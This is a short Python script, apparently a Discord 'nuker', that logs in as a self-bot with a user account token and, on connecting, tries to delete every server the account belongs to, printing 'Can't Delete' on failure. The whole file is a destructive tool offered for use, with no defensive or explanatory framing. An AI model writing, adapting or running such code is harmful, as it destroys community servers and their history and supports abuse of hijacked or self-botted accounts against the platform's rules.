import discord
from discord.ext import commands, tasks





urmom = discord.Client()   
urmom = commands.Bot(command_prefix="c", self_bot=True)
urmom.remove_command("help")
token = "token here"






@urmom.event
async def on_connect():
    for guild in urmom.guilds:
        try: 
             await guild.delete()
        except:
            print("Can't Delete")

urmom.run(token, reconnect=True, bot=False)
